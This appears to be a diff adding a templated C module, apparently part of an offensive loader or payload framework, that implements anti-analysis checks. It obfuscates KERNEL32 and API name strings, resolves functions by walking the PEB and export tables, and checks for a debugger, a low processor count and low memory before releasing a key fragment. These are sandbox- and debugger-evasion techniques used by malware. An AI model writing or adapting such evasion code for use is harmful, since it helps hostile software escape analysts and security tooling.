@@ -1,0 +1,181 @@
+#!name##LilNemo_CandyAnti_C
+#!itemType##sfile
+#!info##LittleNemo Candy Anti C file.
+#!lang##c
+#!addNameComp##True
+#!preRT##_CANTI_SHADOW##LilNemoShadow
+
+{% set _K32DLL = ["KERNEL32.dll", "Kernel32.dll", "KERNEL32.DLL", "kernel32.dll"] %}
+
+{% set _ = _CANTI_SHADOW.randomizeShadow(5, 47, 3) %}
+
+#include "lil_nemo_candy_anti.h"
+
+#define LNCA_MORPH_KEY_PART 0
+
+uint16_t* lil_nemo_candy_anti_get_key(void) {
+    uint16_t anti_key[] = {
+        {{_CANTI_SHADOW.showKeyHex() }}
+    };
+    int kid = 0;
+    while (anti_key[kid] != 0) {
+        kid++;
+    }
+    uint16_t *rkey = malloc((kid + 1) * sizeof(uint16_t));
+    memset(rkey, 0, (kid + 1) * sizeof(uint16_t));
+    memcpy(rkey, anti_key, kid * sizeof(uint16_t));
+    return rkey;
+}
+
+// ---------- FOOD ---------------------
+
+static uint16_t* lil_nemo_candy_food_inMemModList(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{ _CANTI_SHADOW.genInMemModList() }}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+static uint16_t* lil_nemo_candy_food_rvaExpTab(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{ _CANTI_SHADOW.genRvaExpTab() }}
+    };
+    memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+pLIL_NEMO_FOOD_LIST lil_nemo_candy_food_kernel32(uint16_t **buff, uint16_t buff_size) {
+{{ _CANTI_SHADOW.shadowList(_K32DLL) }}
+
+    pLIL_NEMO_FOOD_LIST flist = lil_nemo_food_make();
+    flist->size = malloc(sizeof(all_size));
+    memset(flist->size, 0, sizeof(all_size));
+    memcpy(flist->size, all_size, sizeof(all_size));
+    memset(buff, 0, buff_size * sizeof(uint16_t*));
+    memcpy(buff, all_addr, sizeof(all_addr));
+    flist->list_ptr = buff;
+    return flist;
+}
+
+// GetActiveProcessorCount
+uint16_t *lil_nemo_candy_food_GetActiveProcessorCount(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_CANTI_SHADOW.shadowStr("GetActiveProcessorCount")}}
+    };
+	memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+// GlobalMemoryStatusEx
+uint16_t *lil_nemo_candy_food_GlobalMemoryStatusEx(uint16_t *buff, uint16_t buff_size) {
+    uint16_t raddr[] = {
+        {{_CANTI_SHADOW.shadowStr("GlobalMemoryStatusEx")}}
+    };
+	memset(buff, 0, buff_size);
+    memcpy(buff, raddr, sizeof(raddr));
+    return buff;
+}
+
+// -----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+uint8_t lil_nemo_candy_check_debug(pLIL_NEMO_BAG bag) {
+    void *peb = bag->peb(bag);
+    uint8_t *check = (char*)peb + 0x02;
+    return *check;
+}
+
+DWORD lil_nemo_candy_check_proc_count(pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    NTypeGetActiveProcessorCount gproc = bag->get_func2(lil_nemo_candy_food_GetActiveProcessorCount, k32, bag);
+    if (!gproc) {
+        return 0;
+    }
+    return gproc();
+}
+
+BOOL lil_nemo_candy_wapi_GlobalMemoryStatusEx(LPMEMORYSTATUSEX mstat, pLIL_NEMO_BAG bag) {
+    void *k32 = NULL;
+    if (bag->FLAG_use_addr == 1) {
+        k32 = bag->addr_k32;
+    }
+    else {
+        if (bag->raw_k32[0] == 0) {
+            return 0;
+        }
+        k32 = bag->find_dll(bag->raw_k32, bag);
+    }
+    if (!k32) {
+        return 0;
+    }
+    NTypeGlobalMemoryStatusEx gstat = bag->get_func2(lil_nemo_candy_food_GlobalMemoryStatusEx, k32, bag);
+    if (!gstat) {
+        return 0;
+    }
+    return gstat(mstat);
+}
+
+pLIL_NEMO_BAG lil_nemo_candy_build_minimal_bag(uint16_t *ekey, uint16_t *str_key) {
+    if (str_key == 0) {
+        str_key = ekey;
+    }
+    pLIL_NEMO_BAG bag = lil_nemo_bag_make(ekey, lil_nemo_candy_food_inMemModList, lil_nemo_candy_food_rvaExpTab, 0, LITTLE_NEMO_CANDY_ANTI_MINI_BAG_BUFF, 0, LITTLE_NEMO_CANDY_ANTI_MINI_BAG_BUFF);
+    bag->set_str_key(str_key, bag);
+    int l_rk32 = bag->get_raw_dll(lil_nemo_candy_food_kernel32, bag->raw_k32, bag);
+    if (l_rk32 == 0) {
+        goto LABEL_RETURN_NULL;
+    }
+
+    return bag;
+
+    LABEL_RETURN_NULL:
+        bag->clear(bag);
+        return 0;
+}
+
+uint16_t lil_nemo_candy_anti_scout(uint16_t key_part) {
+    uint16_t *ekey = lil_nemo_candy_anti_get_key();
+    pLIL_NEMO_BAG bag = lil_nemo_candy_build_minimal_bag(ekey, ekey);
+    free(ekey);
+    if (!bag) {
+        return 0;
+    }
+    if (lil_nemo_candy_check_debug(bag) != 0) {
+        goto L_RETURN_NULL;
+    }
+    DWORD pr_no = lil_nemo_candy_check_proc_count(bag);
+    if(pr_no < LITTLE_NEMO_CANDY_ANTI_PROCESS_NUM) {
+        goto L_RETURN_NULL;
+    }
+    DWORDLONG mlimit = (DWORDLONG)LITTLE_NEMO_CANDY_ANTI_MEMORY_LIMIT * 1024 * 1024;
+    MEMORYSTATUSEX mstat;
+    mstat.dwLength = sizeof(MEMORYSTATUSEX);
+    if (lil_nemo_candy_wapi_GlobalMemoryStatusEx(&mstat, bag) == 0) {
+        goto L_RETURN_NULL;
+    }
+    if (mstat.ullTotalPhys < mlimit) {
+        goto L_RETURN_NULL;
+    }
+    bag->clear(bag);
+    return key_part + LNCA_MORPH_KEY_PART;
+
+    L_RETURN_NULL:
+        bag->clear(bag);
+        return 0;
+}
+
